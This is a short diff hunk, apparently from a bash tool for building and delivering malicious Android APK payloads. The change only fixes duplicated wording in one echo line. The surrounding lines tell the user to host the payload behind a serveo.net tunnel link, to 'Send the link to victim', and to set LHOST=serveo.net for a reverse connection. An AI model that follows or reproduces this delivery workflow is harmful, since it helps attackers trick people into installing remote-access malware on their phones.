@@ -22,7 +22,7 @@ then
 echo "[+] Enter Payload's name (Put .apk after your name)" | lolcat
 read -p '>> ' name
 echo ‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡ | lolcat
-echo "[+] Put your payload's  name after the link after the link you get from sh ssh" | lolcat
+echo "[+] Put your payload's name after the link you get from sh ssh" | lolcat
 echo [+] For Example : lente.serveo.net/yourpayload.apk | lolcat
 echo [+] Send the link to victim | lolcat
 echo [+] LHOST=serveo.net | lolcat
